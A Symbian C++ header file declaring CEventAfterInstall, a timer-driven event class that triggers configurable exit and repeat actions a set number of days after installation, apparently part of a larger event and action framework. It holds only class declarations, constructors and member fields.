/*
 * EventAfterInstall.h
 *
 *  Created on: 11/mag/2012
 *      Author: Giovanna
 */

#ifndef EVENTAFTERINSTALL_H_
#define EVENTAFTERINSTALL_H_

// INCLUDES
#include <e32std.h>
#include <e32base.h>

#include "AbstractEvent.h"
#include <HT\TimeOutTimer.h>
#include <HT\Logging.h>

// CLASS DECLARATION

typedef struct TAfterInstallStruct
	{
	TInt iExitAction;
	TInt iRepeatAction;
	TInt iIter;
	TInt iDelay;
	TInt iDays;
	TAfterInstallStruct()
		{
		iExitAction = -1;
		iRepeatAction = -1;
		iIter = -1;
		iDelay = -1;
		iDays = 1;
		}
	} TAfterInstallStruct;
/**
 *  CEventAfterInstall
 * 
 */
class CEventAfterInstall : public CAbstractEvent, public MTimeOutNotifier
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CEventAfterInstall();

	/**
	 * Two-phased constructor.
	 */
	static CEventAfterInstall* NewL(const TDesC8& params, TUint32 aTriggerId);

	/**
	 * Two-phased constructor.
	 */
	static CEventAfterInstall* NewLC(const TDesC8& params, TUint32 aTriggerId);

protected:
	// From CAbstractEvent
	/**
	 * Events MUST implement this method to start their task.
	 */
	virtual void StartEventL();
	/**
	 * Events MUST implement this method to stop their task.
	 */
	virtual void StopEventL();

private:

	/**
	 * Constructor for performing 1st stage construction
	 */
	CEventAfterInstall(TUint32 aTriggerId);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

	// From MTimeOutNotifier
    virtual void TimerExpiredL(TAny* src);
    
    
private:
    
    TAfterInstallStruct	iAfterInstallParams;
	CTimeOutTimer* iTimer;
	TTime iTimeAt;
	//CTimeOutTimer* iTimerTo;
	//TTime iTimeAtTo;
	//TBool iDateTo;
	
	// timer for repeat action
	CTimeOutTimer* iTimerRepeat;
	TTime iTimeAtRepeat;
	TTimeIntervalSeconds iSecondsIntervRepeat;
	TInt iSteps;

	__FLOG_DECLARATION_MEMBER
	};
	
	


#endif /* EVENTAFTERINSTALL_H_ */
